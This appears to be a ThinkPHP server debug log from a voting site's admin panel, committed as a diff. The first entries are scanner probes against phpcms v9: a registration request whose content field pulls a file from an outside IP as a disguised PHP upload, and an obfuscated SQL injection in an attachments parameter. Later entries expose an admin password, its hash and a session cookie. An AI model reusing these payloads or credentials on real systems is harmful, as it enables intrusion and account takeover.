@@ -1,0 +1,2226 @@
+[ 2017-09-24T01:37:04+08:00 ] 118.190.138.146 140.205.225.186 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] tez.lyzfrj.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.014651s][吞吐率：68.25req/s] [内存消耗：1,744.32kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'content-length' => '171',
+  'host' => 'tez.lyzfrj.com:80',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'lVCrvgPH',
+  'password' => 'lVCrvgPH',
+  'email' => 'lVCrvgPH@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T01:37:05+08:00 ] 118.190.138.146 140.205.225.186 GET /index.php?m=wap&a=index&siteid=1
+[ log ] tez.lyzfrj.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.014516s][吞吐率：68.89req/s] [内存消耗：1,741.60kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T01:37:05+08:00 ] 118.190.138.146 140.205.225.186 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ log ] tez.lyzfrj.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.014267s][吞吐率：70.09req/s] [内存消耗：1,742.65kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T01:37:05+08:00 ] 118.190.138.146 140.205.225.186 GET /index.php?m=content&c=down&a_k=
+[ log ] tez.lyzfrj.com:80/index.php?m=content&c=down&a_k= [运行时间：0.014335s][吞吐率：69.76req/s] [内存消耗：1,742.05kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'tez.lyzfrj.com:80',
+  'cookie' => '',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T08:20:25+08:00 ] 118.190.138.146 106.11.225.138 GET /
+[ log ] tez.lyzfrj.com/ [运行时间：0.014147s][吞吐率：70.69req/s] [内存消耗：1,662.74kb] [文件加载：32]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'host' => 'tez.lyzfrj.com',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'connection' => 'keep-alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:06+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.014678s][吞吐率：68.13req/s] [内存消耗：1,741.53kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:06+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/login/login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/login.html [运行时间：0.015123s][吞吐率：66.12req/s] [内存消耗：1,713.21kb] [文件加载：34]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/login/login.html [ array (
+  0 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:06+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/common/verify.html
+[ log ] tez.lyzfrj.com/index.php/admin/common/verify.html [运行时间：0.013400s][吞吐率：74.63req/s] [内存消耗：1,460.63kb] [文件加载：28]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'common',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'image/png, image/svg+xml, image/jxr, image/*;q=0.8, */*;q=0.5',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Common->verify[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Common.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:21+08:00 ] 118.190.138.146 112.248.158.66 POST /index.php/admin/login/do_login.html
+[ log ] tez.lyzfrj.com/index.php/admin/login/do_login.html [运行时间：0.029300s][吞吐率：34.13req/s] [内存消耗：2,683.43kb] [文件加载：41]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'do_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => '*/*',
+  'x-requested-with' => 'XMLHttpRequest',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'host' => 'tez.lyzfrj.com',
+  'content-length' => '39',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'user',
+  'password' => '123456',
+  'code' => '2007',
+)
+[ info ] [ RUN ] app\admin\controller\Login->do_login[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000347s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000719s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_user` WHERE  `username` = 'user' LIMIT 1 [ RunTime:0.000342s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_user` WHERE  `username` = 'user'  AND `password` = 'e10adc3949ba59abbe56e057f20f883e' LIMIT 1 [ RunTime:0.000319s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_role` WHERE  (  role_id = 2 ) LIMIT 1 [ RunTime:0.000152s ]
+[ sql ] [ SQL ] UPDATE `zifi_admin_user`  SET `last_login_ip`='112.248.158.66',`last_login_time`=1506212901  WHERE  `username` = 'user'  AND `password` = 'e10adc3949ba59abbe56e057f20f883e' [ RunTime:0.003699s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:22+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/index/index.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/index.html [运行时间：0.030145s][吞吐率：33.17req/s] [内存消耗：3,157.48kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/login/login.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->index[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/index.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000280s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000614s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000245s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000502s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000148s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000510s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000169s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000179s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000505s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000163s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:22+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/index/main.html
+[ log ] tez.lyzfrj.com/index.php/admin/index/main.html [运行时间：0.028419s][吞吐率：35.19req/s] [内存消耗：3,080.27kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'main',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Index->main[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/index/main.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'domain',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000297s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000612s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000247s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000174s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000519s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000212s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000558s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000168s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:24+08:00 ] 118.190.138.146 112.248.158.66 GET /index.php/admin/vote/user_list.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_list.html [运行时间：0.033800s][吞吐率：29.59req/s] [内存消耗：3,426.27kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/index/index.html',
+  'accept-language' => 'zh-CN',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'tez.lyzfrj.com',
+  'connection' => 'Keep-Alive',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_list[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ VIEW ] /www/wwwroot/tez.lyzfrj.com/application/admin/view/vote/user_list.html [ array (
+  0 => 'controller',
+  1 => 'action',
+  2 => 'list_menu',
+  3 => 'headArr',
+  4 => 'list_data',
+  5 => 'keyword',
+  6 => 'ip',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000389s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000746s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000496s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000139s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000534s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000516s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000162s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000517s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000200s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_user` ORDER BY add_time desc LIMIT 0,50 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `zifi_user` LIMIT 1 [ RunTime:0.000152s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:28:35+08:00 ] 118.190.138.146 112.248.158.66 POST /index.php/admin/vote/user_set.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_set.html [运行时间：0.031096s][吞吐率：32.16req/s] [内存消耗：3,302.46kb] [文件加载：47]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_set',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => '*/*',
+  'x-requested-with' => 'XMLHttpRequest',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/vote/user_list.html',
+  'accept-language' => 'zh-CN',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'host' => 'tez.lyzfrj.com',
+  'content-length' => '5',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+)
+[ info ] [ PARAM ] array (
+  'id' => '84',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_set[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000371s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000725s ]
+[ sql ] [ SQL ] SELECT `role_id` FROM `zifi_admin_user` WHERE  (  admin_id=2 ) LIMIT 1 [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_role` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT `power` FROM `zifi_admin_role` WHERE  (  role_id=2 ) LIMIT 1 [ RunTime:0.000133s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_menu` [ RunTime:0.000483s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid = 0 and shows = 1  ) ORDER BY sort desc [ RunTime:0.000160s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_admin_menu` WHERE  (  fid != 0 and shows = 1 and id in (68,69,11) ) ORDER BY sort desc [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_param` [ RunTime:0.000481s ]
+[ sql ] [ SQL ] SELECT * FROM `zifi_param` [ RunTime:0.000156s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_user` [ RunTime:0.000482s ]
+[ sql ] [ SQL ] UPDATE `zifi_user`  SET `buy`=2  WHERE  `id` = 84 [ RunTime:0.000277s ]
+
+---------------------------------------------------------------
+[ 2017-09-24T08:29:49+08:00 ] 118.190.138.146 112.248.158.66 POST /index.php/admin/vote/user_set.html
+[ log ] tez.lyzfrj.com/index.php/admin/vote/user_set.html [运行时间：0.031034s][吞吐率：32.22req/s] [内存消耗：3,302.46kb] [文件加载：47]
+[ info ] [ LANG ] /www/wwwroot/tez.lyzfrj.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'vote',
+    2 => 'user_set',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => '*/*',
+  'x-requested-with' => 'XMLHttpRequest',
+  'referer' => 'http://tez.lyzfrj.com/index.php/admin/vote/user_list.html',
+  'accept-language' => 'zh-CN',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'host' => 'tez.lyzfrj.com',
+  'content-length' => '5',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'cookie' => 'PHPSESSID=t7k1sup2a9f10mlh2ugfl3dmt0',
+)
+[ info ] [ PARAM ] array (
+  'id' => '84',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Vote->user_set[ /www/wwwroot/tez.lyzfrj.com/application/admin/controller/Vote.php ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000355s ] mysql:dbname=tez_lyzfrj_com;host=127.0.0.1;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `zifi_admin_user` [ RunTime:0.000725s ]
